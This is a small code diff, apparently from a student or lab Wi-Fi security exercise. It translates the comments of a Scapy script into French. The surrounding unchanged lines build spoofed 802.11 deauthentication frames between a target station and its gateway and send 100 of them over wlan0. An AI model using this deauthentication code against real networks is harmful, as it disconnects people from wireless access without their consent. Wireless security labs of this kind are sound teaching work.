@@ -31,7 +31,7 @@ if (reason == 8) : # envoie de la STA à l'AP
     dot11 = Dot11(addr1=gateway_mac, addr2=target_mac, addr3=gateway_mac)
 else : # envoie de l'AP à la STA
     dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
-# stack them up
+# Stacking des infos
 packet = RadioTap()/dot11/Dot11Deauth(reason=reason)
-# send the packet
+# Envoi du paquet
 sendp(packet, inter=0.1, count=100, iface="wlan0", verbose=1)
